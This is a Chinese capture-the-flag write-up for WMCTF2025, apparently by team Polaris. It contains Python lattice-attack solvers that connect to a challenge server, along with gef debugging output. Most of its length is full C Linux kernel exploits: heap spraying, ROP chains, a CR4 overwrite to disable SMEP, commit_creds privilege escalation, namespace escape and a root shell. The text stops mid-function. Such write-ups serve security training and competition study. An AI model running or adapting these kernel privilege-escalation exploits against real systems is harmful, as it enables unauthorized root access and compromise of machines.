# WMCTF2025-WP

> 原文: https://www.ctfiot.com/271862.html
> ID: 271862

本次 WMCTF2025 XMCVE-Polaris 战队排名第 6 。

排名

队伍

总分

1

MNGA

9692

2

SU

6709

3

0psu3

6709

4

Syclover

5769

5

Vidar-Team

5717

6

Polaris

5233

7

r4kapig

4712

8

emmmm

3815

9

HNexus

3801

10

DAWN

3741

先在堆风水的情况下，申请0x159*1的bpf_array，保证后面的堆块也是bpf_array，且给每个堆块都写入一点特殊标识内容。

利用write_cmd写入0x159*2=0x2b2的数据淹没下一个bpf_array的前2个字节让其map_lookup_elem对应的函数指针为map_free。

调用map_init、read_cmd，检查read_cmd返回给用户空间的值，如果是前面对应的特殊标识就调用del_cmd清空指针继续遍历，反之不是前面对应的特殊标识就代表调用了map_free，此时map_init已经将freed_map放入数组中。

大量堆喷array_of_map类型的bpf_array，使得我们前面释放的freed_map又被重新申请到，并将一个array_map指针写入该freed_map（freed_map上会保存array_map的指针）。又因为freed_map指针被保存在了我们驱动的数组中，可以调用read_cmd获取内容，刚好能得到ops的前4字节泄露内核基地址。

再构造0x280*1的bpf_array，淹没下一个bpf_array，保证ops等其他成员正常，劫持index_mask、max_entries以及value_size实现大范围越界读写，修改task_struct提权。

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Neko205


```
defsplit_master(B_decimal, segment_bits): iflen(segment_bits) <3: raiseValueError("no") ifsum(segment_bits) !=512: raiseValueError("no") n = len(segment_bits) found_combination =None forkinrange(n,1,-1): fromitertoolsimportcombinations forindicesincombinations(range(n), k): ifsum(segment_bits[i]foriinindices) >30: continue valid =True foriinrange(len(indices)): forjinrange(i+1, len(indices)): ifabs(indices[i] - indices[j]) <=1: valid =False break ifnotvalid: break ifnotvalid: continue if0inindicesand(n-1)inindices: continue ifany(segment_bits[i]>=25foriinindices): continue found_combination = indices break iffound_combinationisnotNone: break iffound_combinationisNone: raiseValueError("no") binary_str = bin(B_decimal)[2:].zfill(512) iflen(binary_str) >512: raiseValueError("no") segments_binary = [] start =0 forbitsinsegment_bits: end = start + bits segments_binary.append(binary_str[start:end]) start = end segments_decimal = [int(segment,2)forsegmentinsegments_binary] return[segments_decimal[i]foriinfound_combination]defget_leak31(gift): leak = bin(gift[0])[2:].zfill(6) +'?'+ bin(gift[1])[2:].zfill(24) returnleakdefget_leak24(gift): leak = bin(gift[-1])[2:].zfill(24) returnleakdeftest_leak31(b,input): gift = split_master(b,input) leak = bin(gift[0])[2:].zfill(6) +'?'+ bin(gift[1])[2:].zfill(24) returnleakdeftest_leak24(b,input): gift = split_master(b,input) leak = bin(gift[-1])[2:].zfill(24) returnleakdefattack(leaks): n = len(leaks) M = Matrix(QQ,n+2,n+2) foriinrange(n): M[i,i] = q ifi <10: M[-2,i] = A[i]*inverse(2^31,q) % q M[-1,i] = -leaks[i]*inverse(2^31,q) % q else: M[-2,i] = A[i]*inverse(2^24,q) % q M[-1,i] = -leaks[i]*inverse(2^24,q) % q bits =512-24 t = QQ(2^bits / q) K =2^bits M[-2,-2] = t M[-1,-1] = K M[:,:10] *=2^7 forlineinM.LLL(): ifabs(line[-1]) == K: b1_high = abs(line[0]) //2^7 b1 = b1_high *2^31+ leaks[0] secret = b1 * inverse(A[0],q) % q ifisPrime(secret)andint(secret).bit_length() ==512: returnsecret else: secret += q returnsecret fromCrypto.Util.numberimport*fromitertoolsimportproductfrompwnimport*sh = remote("49.232.42.74",30886)sh.recvline()q = int(sh.recvline().strip().decode().split(':')[-1])print(f"q ={q}")input1 =b"481 6 1 24"input2 =b"25 1 462 24"A = []leaks_partial = []print("开始获取数据")foriinrange(10): sh.sendlineafter(b">",input1) a = int(sh.recvline().strip().decode().split(':')[-1]) gift = eval(sh.recvline().strip().decode().split(':')[-1]) A.append(a) leaks_partial.append(get_leak31(gift))foriinrange(10): sh.sendlineafter(b">",input2) a = int(sh.recvline().strip().decode().split(':')[-1]) gift = eval(sh.recvline().strip().decode().split(':')[-1]) A.append(a) leaks_partial.append(get_leak24(gift)) print("数据获取完毕")combos = ['0','1']num_brute_force =10all_combos = product(combos, repeat=num_brute_force)print(f"开始对前{num_brute_force}组数据进行爆破...")forcurrent_combosinall_combos: leaks_for_attack = [0] * len(leaks_partial) # 填充要爆破的数据集 foriinrange(num_brute_force): combo = current_combos[i] complete_bin = leaks_partial[i].replace('?', combo) leaks_for_attack[i] = int(complete_bin,2) # 填充剩余的leaks foriinrange(num_brute_force, len(leaks_partial)): leaks_for_attack[i] = int(leaks_partial[i],2) found_key = attack(leaks_for_attack) test_b1 = [A[i] * found_key % qforiinrange(10)] ifall(test_leak31(test_b1[i],[481,6,1,24]) == leaks_partial[i]foriinrange(10)): print(found_key) sh.sendlineafter(b"the key to the flag is: ",str(found_key).encode()) print(sh.recvline().strip().decode()) # WMCTF{Th3_d1ff1culty_Is_up_t0_y0u}
```



```
defsplit_master(B_decimal, segment_bits): iflen(segment_bits) <3: raiseValueError("no") ifsum(segment_bits) !=512: raiseValueError("no") n = len(segment_bits) found_combination =None forkinrange(n,1,-1): fromitertoolsimportcombinations forindicesincombinations(range(n), k): ifsum(segment_bits[i]foriinindices) >30: continue valid =True foriinrange(len(indices)): forjinrange(i+1, len(indices)): ifabs(indices[i] - indices[j]) <=1: valid =False break ifnotvalid: break ifnotvalid: continue if0inindicesand(n-1)inindices: continue ifany(segment_bits[i]>=25foriinindices): continue found_combination = indices break iffound_combinationisnotNone: break iffound_combinationisNone: raiseValueError("no") binary_str = bin(B_decimal)[2:].zfill(512) iflen(binary_str) >512: raiseValueError("no") segments_binary = [] start =0 forbitsinsegment_bits: end = start + bits segments_binary.append(binary_str[start:end]) start = end segments_decimal = [int(segment,2)forsegmentinsegments_binary] return[segments_decimal[i]foriinfound_combination]p=7159749741429322755131240146118071759513715820993285825839372472474407666017557572129271731613358007058734527689330441569348431807180112353088919340436347A=[6099484397780065687822398499925956660167123649401003086450429553387635127108172239381711192830201627868739985455478039493705929385423995630816089813826652,89722133899180146464100891510163842168405798298452823483063318133678868709451123173510945333104825653032959450315649783796310151123989041792721415722484,6852373640840439902263069245352036561377612959731529442657261290464193432386684112062098796260781796040393491512167644773780010990517598995340849012156752,905572447043025859658716967933649489546055535993585428025481014254600350130412634867260097168151503405254514553766823286383565893018173373564554336056693,4619203611445979770240267215110891760841947947738244443460262136009336416179092898214434705455167036725713675890810610700106198084790551650093160195275702,3069238570521651083095142261917310941562970802732278543454193591033820858125892411024150728211080137659037098102856608536404922668196774692048992081648551,2072290141156875572599510174743549619222963372822414855220494223803795956351998912692844952044029330311821434784805742487737048376693843981146845532811418,4118630348835299974900731058046317343585580076694977535798202938226187304960635726712385771299418425062431822315135332845240129948946520330840063372710812,5494897767679702083905262716715474988716617413297387287978901109122932238365802120197755794026314539468927208231771384572456104728695543349076171476106692,5242904898120293050194404817363504806316489104114848367489798169501727630568797399722291273601688449269113866312614390323808528035310223034076071688527093]B=[2225881589521184173065274225912017053067069649965432632423136697355986574624766674385247816885344883664964124555071710934403200036986056742665338710501199,6648320309177586281256682217887823816445310746588184022611740437856487828841524257412678979289757558617628247133981523476180196883192489542467687175493866,1368643343865975119970439821808519233195197253476459608302319415282308653927922072355125801570423137124789823080768464141261145798676583005521122600184021,4757972435898893943050634851470164873875968802674701938325764517462502213399385660925464222079964582272246709905040569303916540860368398046797311634207119,3491493600654315810383896038657359020801782746573223354229968950004336723011925225140197224620617196713846979463196337854602425927920594332253840267066287,5812910599586334226756848369194045700041602130860303332014243049211324518168755764068940745746358136899818045819591702608213306673108319488577075164061902,5286480909173195769260613883921498519696474112632193807758953252056528658290642833837928174403014629586637399671995087032742056865191425515352773317139947,5990084243427240363832897819696345106790895509165460228212982648304258173654753003702718799678678397988011691031933597893892134441380835867546094903910961,4657207884013678545225122398830559190905549085156416548267023047411835416409008088567237198440378272503925106822333599825940007094045484876222921444207859,4337342732185682149995046884384392099143035562597116814453255157188836395606408153375003404584342070812600880379801960599561396105172991519802949392096959]R=[[5437342344417526961447037102420381576182242917002824736531383988448576795401348337669838142255293777506485879415403692176729738237621696959342977281065396,118207420592466754679295752653401966487038067694232692642557897325071960359432451312279399266748403346434433562012104799520263992802423378954266828804131,7096197247368703535624516822532525663824053041765748785834200261711792994365801659587654582314309510718479268191354720373426303224114439156530646421389487], [2048337393654342724878996996835462937898615364747266814141518152181142819685131064444737246705773125581643549980403948577060721913752092536246991248488798,4032915799560554709639638304258383923016302450145031749214368211030759499850002173909365184297695024196808815382820437454460747458506629192382539028901160,4232871593307892145191764881832084004817150942430800176840205014538991625057835110518374643680800074286367340775128361231313202429848296012489919924979266], [2553386960937591100090865827289064489951927968995578370310341693487902315425241611375327831218812187817696136311487587016400127802098102736127873401818913,5823670592022005462447151598758745521401539301567430301030393638437006554138239970651467866637510447017480176716140423825242961163243963505222273874838613,5774084025457416187346689800934856256827564486310334723289121828349816917057440353481035763960569668502226684658505097070668779989218703360744064625684871], [7046572309712543369992700561219588655579833588142366002445356785295649361641707579997338719645976088701747288198545152391667165237528203051491380206476100,3086411743880543388057778894558929465483005347509988210044202022882123069984407733408405454699097438747656268706316626496116194702187510362704226701362680,3824920704333716278162115284149190730865231866245771161577917822721893196275454552093227654236325852790896150665403865418453038676291626669950621607864235], [6760618245898750953819376194151632666239738960636983938459565687242233704064651489179662554150497876748082273757875418325340597777457003363001123655534527,4343397856990866281857795612386217816895468511981051731094731266904611655944226707430233814074001565540730803579725372227013575628572646210241319814714476,7126011694277861782468567565693664008866580617261568379233477615778205440306291716911745585348838954153812439519950532595352182974188212855768277246923419], [2953923187831173071776186551032070259914505167253362070557203382982396081492190509064486405525934004929672640497574202986456906310807830423216504796476927,1345669062441589204474792668690191778211085836386374497142860395037294956095491918997725669029150439803057766748915079527876461488078624845798404978671362,6975771805724338057550497476188442963101655123133481610941634405619501180059972427132933469246923537067484663454770321483398210207386857564548399452193784], [613595431074082703746546668753146025816666490902587228756275516028887275638378432031652661608234989583525385999489844534573227312653028029927921272453512,4123105910746992373978630252040464408125059102592223292674058753777019714209155710896007043366563874898777820917476610249503568925138753611543704471760303,989555937865263901715230959831678853496396994080634488540356871394920097958240471950255879798889334377502384605373832255522749450694078070958912976709214], [5535837862012327812765107969360670846116191751375838521859633639946929019321243840486291205554534270213183060274542457089991919161794065714297577071253492,2217022003356883793255174224244083193207752640022692463419248286782028965975927441224003452590436406144452759467937867082143500151445862797223973537424326,4169012965258555766659454909927125486691566973583123755296718808398491419295598806865374588756721952326039465076613735671092746736038930739233766233317746], [2460973952017922432127354291027776825014962112677929880673566789249322210046943034298740329681812324994822480424953136978723367413424675867422535483400994,6525560390886316331291464628669910149125483607726248566635546904534294626062586662528213108239725365594595677881216065984903337839878980240035564934046552,5267455846476800778837810675968652912499902190539148131941469838044707979168868352552242860860469415418625601143261920057498327632704722410629571902757207], [2836101201606404086963674515196242099981794676200180367684860793033271859982764426617335526949325589855895823167197136257361757221153866636871210172909499,2905746791428321890819637325300810834453495282574466482434863215508033662223795925912808993026408194967015679126821486382496994000126841698935066307107806,6179734411062461009407000122687973511105948755170244204181450729410647901986426188970783453277592832386486628788023466433324078852891442496360969724173650]]gift=[841309,840]C = [(A[i] * B[0] - A[0] * B[i]) % pforiinrange(1,10)]K =2^256M = Matrix(ZZ,40,40)foriinrange(9): M[i,i] = p M[-1,i] = C[i] foriinrange(9,39): ifi %3==0: M[i,i] =2^192 ifi %3==1: M[i,i] =2^128 ifi %3==2: M[i,i] =1M[-1,-1] = Knum_l =9 # 列 0..8 对应 l1..l9num_k =30 # 列 9..38 对应 k_{0,1..3}, k_{1,1..3}, ..., k_{9,1..3}# 列索引映射：样本 s (0..9), j (0..2)defcol_idx(s, j): returnnum_l + s*3+ j # s=0 -> cols 9,10,11 ; s=1 -> 12,13,14 ; ... s=9 -> 36,37,38# 1) 填 k_{0,*} 行中的前 9 列：这些行是行索引 = col_idx(0,j)# 对应矩阵元素 M[row, c] = A[c+1] * R[0][j] (c=0..8 对应 A1..A9)forjinrange(3): # j = 0,1,2 对应 k_{0,1..3} row = col_idx(0, j) forcinrange(num_l): # c = 0..8 对应 l1..l9 # 注意：A[0] 是 A0；A1..A9 在 A[1]..A[9] M[row, c] = Integer(A[c+1] * R[0][j])# 2) 填每个 i=1..9 的 k_{i,*} 行：这些行是 row = col_idx(i, j)# 在这些行的第 (i-1) 列 放 -A0 * R[i][j]# 其余前9列为0（已初始化为0）foriinrange(1,10): # i = 1..9 forjinrange(3): # j = 0..2 row = col_idx(i, j) col = i -1# l_i 对应列 index i-1 M[row, col] = Integer(- A[0] * R[i][j])M[:,:9] *=2^1000res = M.LLL()[0][9:-1]K = []foriinrange(len(res)): ifi %3==0: k = abs(res[i]) //2^192 K.append(k) ifi %3==1: k = abs(res[i]) //2^128 K.append(k) ifi %3==2: k = abs(res[i]) K.append(k)k01,k02,k03 = K[:3]r01,r02,r03 = R[0]key = (B[0] - (r01*k01 + r02*k02 + r03*k03) % p) * inverse(A[0],p) % passertsplit_master(key,[182,20,200,10,100]) == giftflag="WMCTF{"+md5(str(key).encode()).hexdigest()+"}"print(flag)# WMCTF{ed27074de5c476e67328e04b6e27a5b8}
```



```
for(inti =0; i <0x100000/0x1000; i++) { strcpy(buf+i*0x1000,"XiaozaYaPwner"); } for(inti =0; i <0x100; i++) { if(prctl(PR_SET_NAME, buf,0,0,0) !=0) { err_exit("cannot set name"); } }
```



```
gef> search-pattern XiaozaYaPwner[+] Searchingfor'XiaozaYaPwner'in whole memory[+] In (0xffff9c6382b77000-0xffff9c6382c00000[rw-] (0x89000bytes)0xffff9c6382b91628: 5869616f7a61596150776e6572000000 | XiaozaYaPwner... |[+]0xffff9c638ca00000-0xffff9c639fe00000is skipped due to size (0x13400000) >= MAX_REGION_SIZE (0x10000000)[+] In (0xffffffff9ae00000-0xffffffff9b000000[rw-] (0x200000bytes)0xffffffff9ae87050: 5869616f7a61596150776e657200ff ff | XiaozaYaPwner... |......0xffffffff9aeff050: 5869616f7a61596150776e657200ff ff | XiaozaYaPwner... |gef> kbase[+] Waitformemory scankernel text: 0xffffffff98800000-0xffffffff99a00000(0x1200000bytes)kernel rodata:0xffffffff99a00000-0xffffffff9a0aa000(0x6aa000bytes)kernel data: 0xffffffff9a0aa000-0xffffffff9ace5000(0xc3b000bytes)gef> v2p0xffffffff9aece050Virt:0xffffffff9aece050-> Phys:0xcace050gef> p2v0xcace050Phys:0xcace050-> Virt:0xffff9c638cace050Phys:0xcace050-> Virt:0xffffffff9aece050Total2results are foundgef> vmmap0xffffffff98800000-0xffffffff99a000000x000000000a400000-0x000000000b6000000x1200000 0x200000 9 [R-X KERN ACCESSEDGLOBAL] <================================ kernel text0xffffffff99a00000-0xffffffff9a0000000x000000000b600000-0x000000000bc000000x600000 0x200000 3 [R-- KERN ACCESSEDGLOBAL] <================================ kernel rodata_00xffffffff9a000000-0xffffffff9a0aa0000x000000000bc00000-0x000000000bcaa0000xaa000 0x1000 170 [R-- KERN ACCESSEDGLOBAL] <================================ kernel rodata_10xffffffff9a0aa000-0xffffffff9a2000000x000000000bcaa000-0x000000000be000000x156000 0x1000 342 [RW- KERN ACCESSEDGLOBAL] <================================ kernel data_00xffffffff9a200000-0xffffffff9aa000000x000000000be00000-0x000000000c6000000x800000 0x200000 4 [RW- KERN ACCESSED DIRTYGLOBAL] <================================ kernel data_00xffffffff9aa00000-0xffffffff9ace50000x000000000c600000-0x000000000c8e50000x2e5000 0x1000 741 [RW- KERN ACCESSED DIRTYGLOBAL] <================================ kernel data end0xffffffff9ace5000-0xffffffff9ace60000x000000000c8e5000-0x000000000c8e60000x1000 0x1000 1 [R-- KERN ACCESSEDGLOBAL] <================================ map00xffffffff9ace6000-0xffffffff9ae000000x000000000c8e6000-0x000000000ca000000x11a000 0x1000 282 [RW- KERN ACCESSED DIRTYGLOBAL] <================================ map10xffffffff9ae00000-0xffffffff9b0000000x000000000ca00000-0x000000000cc000000x200000 0x200000 1 [RW- KERN ACCESSED DIRTYGLOBAL] <================================ >_< target_map
```



```
0xffffffff81efe18a: mov cr4,rbx 0xffffffff81efe18d: test rdx,rdx 0xffffffff81efe190: je 0xffffffff81efe1a9 0xffffffff81efe192: mov rsi,QWORD PTR [rdx] 0xffffffff81efe195: mov rdi,QWORD PTR [rdx+0x8] 0xffffffff81efe199: mov rcx,0x200 0xffffffff81efe1a0: rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi] 0xffffffff81efe1a3: mov rdx,QWORD PTR [rdx+0x10] 0xffffffff81efe1a7: jmp 0xffffffff81efe18d 0xffffffff81efe1a9: jmp r8
```



```
#define_GNU_SOURCE#include<stdio.h>#include<unistd.h>#include<stdlib.h>#include<fcntl.h>#include<signal.h>#include<string.h>#include<stdint.h>#include<sys/mman.h>#include<sys/syscall.h>#include<sys/ioctl.h>#include<sched.h>#include<ctype.h>#include<pthread.h>#include<sys/types.h>#include<sys/sem.h>#include<semaphore.h>#include<poll.h>#include<sys/ipc.h>#include<sys/msg.h>#include<sys/shm.h>#include<sys/wait.h>#include<sys/socket.h>#include<sys/prctl.h>#defineREDS" 33[31m 33[1m"#defineREDE" 33[0m"#definefail_exit(msg) { printf(REDS"[Error %s, %d line, %s]: %sn"REDE, __FUNCTION__, __LINE__, __FILE__, msg); exit(-1); }voiderr_exit(char*msg){ perror(msg); sleep(2); exit(EXIT_FAILURE);}voidinfo(char*msg){ printf(" 33[32m 33[1m[+] %sn 33[0m", msg);}voidhexx(char*msg,size_tvalue){ printf(" 33[32m 33[1m[+] %s: %#lxn 33[0m", msg, value);}voidbinary_dump(char*desc,void*addr,intlen){ uint64_t*buf64 = (uint64_t*) addr; uint8_t*buf8 = (uint8_t*) addr; if(desc !=NULL) { printf(" 33[33m[*] %s:n 33[0m", desc); } for(inti =0; i < len /8; i +=4) { printf(" %04x", i *8); for(intj =0; j <4; j++) { i + j < len /8?printf(" 0x%016lx", buf64[i + j]) :printf(" "); } printf(" "); for(intj =0; j <32&& j + i *8< len; j++) { printf("%c",isprint(buf8[i *8+ j]) ? buf8[i *8+ j] :'.'); } puts(""); }}/* root checker and shell poper */voidget_root_shell(void){ if(getuid()) { puts(" 33[31m 33[1m[x] Failed to get the root! 33[0m"); sleep(2); exit(EXIT_FAILURE); } puts(" 33[32m 33[1m[+] Successful to get the root.  33[0m"); puts(" 33[34m 33[1m[*] Execve root shell now... 33[0m"); system("/bin/sh"); /* to exit the process normally, instead of segmentation fault */ exit(EXIT_SUCCESS);}/* userspace status saver */size_tuser_cs, user_ss, user_rflags, user_sp;voidsave_status(){ asmvolatile( "mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;" ); puts(" 33[34m 33[1m[*] Status has been saved. 33[0m");}/* bind the process to specific core */voidbind_core(intcore){ cpu_set_tcpu_set; CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(),sizeof(cpu_set), &cpu_set); printf(" 33[34m 33[1m[*] Process binded to core  33[0m%dn", core);}typedefstructreq{ unsignedlongkernel_addr; unsignedlonguser_addr;}req;size_tg_commit_creds =0;size_tg_find_task_by_vpid =0;size_tg_switch_task_namespace =0;size_tg_copy_fs_struct =0;size_tg_init_cred =0;size_tg_init_fs =0;size_tg_init_nsproxy=0;int(*commit_creds_kfunc)(void*cred);void* (*find_task_by_vpid_kfunc)(intpid);void(*switch_task_namespace_kfunc)(void*p,void*new);void* (*copy_fs_struct_kfunc)(void* old);intpid =0;voidret2usr_attack(void){ commit_creds_kfunc = (int(*)(void*)) g_commit_creds; find_task_by_vpid_kfunc = (void* (*)(int)) g_find_task_by_vpid; switch_task_namespace_kfunc = (void(*)(void*,void*)) g_switch_task_namespace; copy_fs_struct_kfunc = (void* (*)(void*)) g_copy_fs_struct; (*commit_creds_kfunc)(g_init_cred); void* task = find_task_by_vpid_kfunc(1); switch_task_namespace_kfunc(task, g_init_nsproxy); void* new_fs = copy_fs_struct_kfunc(g_init_fs); void* current = find_task_by_vpid_kfunc(pid); *(size_t*)((size_t)current+0x798) = new_fs; asmvolatile( "mov rax, user_ss;" "push rax;" "mov rax, user_sp;" "sub rax, 8;" /* stack balance */ "push rax;" "mov rax, user_rflags;" "push rax;" "mov rax, user_cs;" "push rax;" "lea rax, get_root_shell;" "push rax;" "swapgs;" "iretq;" );}intmain(){ save_status(); bind_core(0); pid = getpid(); charbuf[0x100000] = {0}; unsignedlong* pbuf = buf; intfd = open("/dev/wmeasyker", O_RDWR); if(fd <=0) err_exit("Failed to open /dev/wmeasyker"); unsignedlongaddr =0; req req = { .user_addr = &addr, .kernel_addr =0xfffffe0000000000+4}; ioctl(fd,0x8888, &req); unsignedlongkbase = addr -0x1008e00; unsignedlongkoffset = kbase -0xffffffff81000000; unsignedlongname_addr = kbase +0x18aa010+0x1000*0xa50+ ((unsignedlong)buf&0xfff); hexx("buf_addr", buf); hexx("addr", addr); hexx("koffset", koffset); hexx("kbase", kbase); hexx("name_addr", name_addr); unsignedlongpop_rdi =0x301db9+ kbase; unsignedlongret =0xffffffff8100041e+ koffset;// ret; unsignedlonginit_cred =0x1a50f60+ kbase; unsignedlongcommit_creds =0xc38b0+ kbase; g_init_cred = init_cred; g_commit_creds = commit_creds; g_init_fs =0xffffffff82b6de20+koffset; g_init_nsproxy =0xffffffff82a50a80+koffset; g_copy_fs_struct =0xffffffff81357c40+koffset; g_find_task_by_vpid =0xffffffff810b8ce0+koffset; g_switch_task_namespace =0xffffffff810c1670+koffset; //hexx("pop_rdi", pop_rdi); for(inti =0; i <0x100000/8; i++) { pbuf[i] = ret; } // ======> gadget 找不到放弃(: 悲 unsignedintidx =0;// pbuf[0x8000 / 8 - 0x500+idx++] = pop_rdi;// pbuf[0x8000 / 8 - 0x500+idx++] = init_cred;// pbuf[0x8000 / 8 - 0x500+idx++] = commit_creds;// pbuf[0x8000 / 8 - 0x500+idx++] = pop_rdi;// pbuf[0x8000 / 8 - 0x500+idx++] = 1; // 0xffffffff810b8ce0: find_task_by_vpid // 0xffffffff810ecf03: pop rcx; ret; // 0 // 0xffffffff81024fcc: push rax; ret; // pop_rdi // 0xffffffff810382d2: push rsi; ret; // 0xffffffff82a50a80 D init_nsprox // 0xffffffff810c1670 T switch_task_namespace // pop_rdi // 0xffffffff82b6de20 D init_fs // 0xffffffff81357c40 T copy_fs_struct // push_rax // 0xffffffff8106a167: pop rbx; ret; // pop_rdi // getpid() // find_task_by_vpid // pop_rcx // current->fs // 还是想办法 ret2usr 吧(: // ========> 搞半天发现 0xffffffff81301d42 是只读的(: 悲 //hexx("mov cr4, rdi", 0xffffffff81049426 + koffset); unsignedlongexecbuf = mmap(0,0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS,-1,0); for(inti =0; i <0x1000/8; i++) { *(size_t*)(execbuf + i*8) = ret; } pbuf = execbuf; pbuf[256+idx++] =0xffffffff81004d20+koffset; pbuf[256+idx++] = ret2usr_attack; pbuf[256+idx++] =0; pbuf[256+idx++] =0; pbuf[256+idx++] =0; pbuf[256+idx++] =0; pbuf[256+idx++] =0; pbuf[256+idx++] =0; pbuf[256+idx++] =0xffffffff8106a167+koffset;// pop_rbx ; ret pbuf[256+idx++] =0x6f0; pbuf[256+idx++] =0xffffffff81301d42+koffset;// pop rdx ; ret pbuf[256+idx++] =0; pbuf[256+idx++] =0xffffffff81efe18a+koffset; idx =0; pbuf = buf; hexx("execbuf", execbuf); /* pbuf[0x8000 / 8 - 0x500+idx++] = pop_rdi; pbuf[0x8000 / 8 - 0x500+idx++] = kbase+0x18067f0; pbuf[0x8000 / 8 - 0x500+idx++] = 0xffffffff8165a0a7 + koffset; // pop_rsi pbuf[0x8000 / 8 - 0x500+idx++] = 0xffffffff81049437 + koffset; pbuf[0x8000 / 8 - 0x500+idx++] = 0xffffffff81301d42 + koffset; // pop rdx ; ret pbuf[0x8000 / 8 - 0x500+idx++] = 4; pbuf[0x8000 / 8 - 0x500+idx++] = 0xffffffff81f2cb00 + koffset; // copy pbuf[0x8000 / 8 - 0x500+idx++] = pop_rdi; pbuf[0x8000 / 8 - 0x500+idx++] = 0x6f0; pbuf[0x8000 / 8 - 0x500+idx++] = 0xffffffff81049426 + koffset; // mov cr4, rdi ; jmp 0xffffffff81049445 pbuf[0x8000 / 8 - 0x500+idx++] = execbuf; */ // =========> 找到一个不错的 mov cr4,rbx gadget 我终于笑了(: /* 0xffffffff81004d20: pop r8 0xffffffff81004d22: pop rax 0xffffffff81004d23: pop rcx 0xffffffff81004d24: pop rdx 0xffffffff81004d25: pop rsi 0xffffffff81004d26: pop rdi 0xffffffff81004d27: pop rbp 0xffffffff81004d28: ret 0xffffffff81efe18a: mov cr4,rbx 0xffffffff81efe18d: test rdx,rdx 0xffffffff81efe190: je 0xffffffff81efe1a9 0xffffffff81efe192: mov rsi,QWORD PTR [rdx] 0xffffffff81efe195: mov rdi,QWORD PTR [rdx+0x8] 0xffffffff81efe199: mov rcx,0x200 0xffffffff81efe1a0: rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi] 0xffffffff81efe1a3: mov rdx,QWORD PTR [rdx+0x10] 0xffffffff81efe1a7: jmp 0xffffffff81efe18d 0xffffffff81efe1a9: jmp r8 */ for(inti =0; i <0x100000/0x1000; i++) { strcpy(buf+i*0x1000,"XiaozaYaPwner"); idx =0; pbuf[i*0x1000/8+256+idx++] =0xffffffff81004d20+koffset;// pbuf[i*0x1000/8 + 256+idx++] = execbuf; pbuf[i*0x1000/8+256+idx++] = ret2usr_attack; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0xffffffff8106a167+koffset;// pop_rbx ; ret pbuf[i*0x1000/8+256+idx++] =0x6f0; pbuf[i*0x1000/8+256+idx++] =0xffffffff81301d42+koffset;// pop rdx ; ret pbuf[i*0x1000/8+256+idx++] =0; pbuf[i*0x1000/8+256+idx++] =0xffffffff81efe18a+koffset; } hexx("mov cr4,rbx",0xffffffff81efe18a+koffset); //memset(buf, 'X', sizeof(buf)); for(inti =0; i <0x100; i++) { if(prctl(PR_SET_NAME, buf,0,0,0) !=0) { err_exit("cannot set name"); } } // getchar(); ioctl(fd,0x9999, &name_addr); getchar(); puts("[!] EXP END!"); return0;}
```



```
0x150+0x159*2=0x402
```



```
0x150+0x280*2=0x650
```



```
#include<stdio.h>#include<stdlib.h>#include<ctype.h>#include<signal.h>#include<fcntl.h>#include<stdint.h>#include<sys/ioctl.h>#include<sys/prctl.h>#include<linux/sched.h>#include<unistd.h>#include<wait.h>#include"bpf.h"typedefstruct_ioctl_arg{ uint32_tidx; uint32_tfd; uint64_tsize; uint64_tbuffer;} ioctl_arg, *pioctl_arg;unsignedlonguser_rip, user_ss, user_sp, user_cs, user_rflags;intko_fd;uint64_tkernelbase, init_nsproxy =0x2c729c0, init_cred =0x2c72ea0;voiderror_quit(constchar* msg){ perror(msg); del_cmd(0); del_cmd(1); exit(0);}voidget_shell(){ printf(" 33[35mGetShell Success! 33[0mn"); intfd = open("/flag",0); charflag[0x100] = {0}; read(fd, flag,0x100); puts(flag); return;}voidbinary_dump(char* buf,size_tsize,longlongbase_addr){ printf(" 33[33mDump:n 33[0m"); char* ptr; for(inti =0; i < size /0x20; i++) { ptr = buf + i *0x20; printf("0x%016llx: ", base_addr + i *0x20); for(intj =0; j <4; j++) { printf("0x%016llx ", *(longlong*)(ptr +8* j)); } printf(" "); for(intj =0; j <0x20; j++) { printf("%c",isprint(ptr[j]) ? ptr[j] :'.'); } putchar('n'); } if(size %0x20!=0) { intk = size - size %0x20; printf("0x%016llx: ", base_addr + k); ptr = buf + k; for(inti =0; i <= (size - k) /8; i++) { printf("0x%016llx ", *(longlong*)(ptr +8* i)); } for(inti =0; i <3- (size - k) /8; i++) { printf("%19c",' '); } printf(" "); for(intj =0; j < size - k; j++) { printf("%c",isprint(ptr[j]) ? ptr[j] :'.'); } putchar('n'); }}voidsave_user_land(){ __asm__( ".intel_syntax noprefix;" "mov user_cs,cs;" "mov user_sp,rsp;" "mov user_ss,ss;" "pushf;" "pop user_rflags;" ".att_syntax;" ); user_rip = (unsignedlong)get_shell; puts(" 33[34mUser land saved. 33[0m"); printf(" 33[34muser_ss:0x%llx 33[0mn", user_ss); printf(" 33[34muser_sp:0x%llx 33[0mn", user_sp); printf(" 33[34muser_rflags:0x%llx 33[0mn", user_rflags); printf(" 33[34muser_cs:0x%llx 33[0mn", user_cs); printf(" 33[34muser_rip:0x%llx 33[0mn", user_rip); if(prctl(PR_SET_NAME,"0rb1t123",0,0,0) !=0) { printf("Could not set name"); }}voidcircle_print(charbuf[],intline_size,intsize){ intl =0; for(inti =0; i < size; i++, l++) { putchar(buf[i]); if(buf[i] =='n') l =0; if((l +1) % line_size ==0) { putchar('n'); } }}intspawn_processes(pid_t*processes){ for(inti =0; i <0x100; i++) { pid_tchild = fork(); if(child ==0) { if(prctl(PR_SET_NAME,"0rb1t123",0,0,0) !=0) { puts("Could not set name"); } uid_told = getuid(); kill(getpid(), SIGSTOP); uid_tuid = getuid(); while(getuid() !=0) ; if(uid ==0&& old != uid) { charbuf[0x100] = {0}; intfd = open("/dev/vda", O_RDONLY); if(fd <0){ puts("File open error."); exit(1); } read(fd, buf,0x100); write(1, buf,0x100); } exit(uid); } if(child <0) { returnchild; } 